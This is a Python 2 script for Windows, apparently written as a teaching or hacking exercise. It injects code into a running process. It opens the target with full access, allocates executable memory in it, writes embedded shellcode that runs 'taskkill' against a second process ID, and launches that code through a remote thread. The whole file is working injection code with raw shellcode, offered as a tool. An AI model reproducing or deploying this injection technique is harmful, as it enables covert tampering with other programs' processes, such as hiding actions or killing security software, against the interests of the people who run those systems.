'''
Created on 30 Aug 2017

@author: Muhammad Arslan <rslnkrmt2552@gmail.com>
'''

import sys
from ctypes import *

PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0XFFF )
VIRTUAL_MEM = ( 0x1000 | 0x2000 )

kernel32 = windll.kernel32

try:
    pid = int(sys.argv[1])
    pid_to_kill = sys.argv[2]
except:
    print "Usage:\nCode Injector: ./code_injector.py <PID to inject> <PID to kill>"
    sys.exit(0)

shellcode =  ""
shellcode += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shellcode += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shellcode += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shellcode += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shellcode += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shellcode += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shellcode += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shellcode += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shellcode += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shellcode += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shellcode += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d"
shellcode += "\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shellcode += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
shellcode += "\xff\xd5\x74\x61\x73\x6b\x6b\x69\x6c\x6c\x20\x2f\x50"
shellcode += "\x49\x44\x20\x41\x41\x41\x41\x41\x41\x41\x41\x00"

padding = 4 - len(pid_to_kill)
replace_value = pid_to_kill + ("\x00" * padding)
replace_string = "\x41" * 4

shellcode = shellcode.replace(replace_string, replace_value)
code_size = len(shellcode)

h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)

arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))

thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
    print "[*] Failed to inject process-killing shellcode. Exiting ..."
    sys.exit(0)

print "[*] Remote thread created with a thread ID of: 0x%08x" % thread_id.value
print "[*] Process %s should not be running anymore!" % pid_to_kill

